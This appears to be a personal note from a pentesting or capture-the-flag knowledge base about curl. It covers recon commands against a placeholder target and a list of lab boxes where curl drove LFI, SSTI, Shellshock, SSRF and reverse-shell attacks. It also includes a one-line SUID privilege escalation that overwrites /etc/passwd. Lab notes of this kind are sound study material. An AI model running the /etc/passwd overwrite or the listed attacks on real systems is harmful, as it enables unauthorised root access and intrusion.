---
type: tool
category: http-client
related: ["[[information-gathering]]", "[[node-inspector-rce]]", "[[prototype-pollution]]"]
---

# Curl

Command-line HTTP client — the workhorse for web recon, banner grabbing, hitting JSON APIs, and driving exploits over HTTP.

## Common usage

```sh
curl -i http://TARGET/            # response headers + body
curl -sI http://TARGET/           # headers only (service fingerprinting)
curl -s http://TARGET/json        # fetch a JSON endpoint (e.g. Node inspector)
curl -X POST http://TARGET/ \
  -H "Next-Action: x" \
  --data-binary @payload.bin      # send a crafted multipart body
```

- `-s` silent · `-i` include headers · `-I` HEAD only · `-X` method · `-H` header · `-d`/`--data-binary` body.

## As a SUID file-writer

When `/usr/bin/curl` carries mode `4755`, it reads and writes *as root* — `file://` is the read, `-o` is the write:

```sh
curl file:///tmp/passwd -o /etc/passwd    # arbitrary root file write
```

That's the entire privesc on [[chmod-4755]] ([[writable-etc-passwd]], [[suid-enumeration]]) — the box name was the hint.

## Seen in

[[autoescuela]] (Node inspector `/json` + React2Shell exploit), [[los-3-hackers]], [[psycho]], [[balufood]], [[balulero]], [[hannah-coffee]], [[wargames]], [[grooti]], [[winfake]], [[duque]], [[injection]], [[pipepwned]] (SSTI payloads via `-d name=`/`-d ref=` POST), [[trailpack]] (crafted `user_info` cookie against `/api/me` + `/accounting`), [[bruteshock]] (Shellshock `User-Agent` payload), [[littlepivoting]] (LFI `/etc/passwd` read via `?archivo=`), [[internal]] (303 `Location:` header leaked the `internal.dl` vhost), [[analyst]] (fetched the incident artifacts `threat_intel_feed.json` + `incidente_pinguino.pcap` from `/descargas/`), [[chmod-4755]] (SUID `file://` overwrite of `/etc/passwd`), [[dark]] (drove the `url=`/`cmd=` POSTs — LFI, SSRF fetch of an internal host, and the reverse-shell payload — then the same SUID `file://` overwrite on host 2), [[rutas]] (fetched `index.php`, then fired the `?love=` [[remote-file-inclusion]] with `-H "Authorization: Basic …"`), [[file]] (`curl file_upload.php` to read the `<form action=…>` — the page that renders and the endpoint that accepts are different — then `curl /uploads/revshell.phar` to trigger the payload)
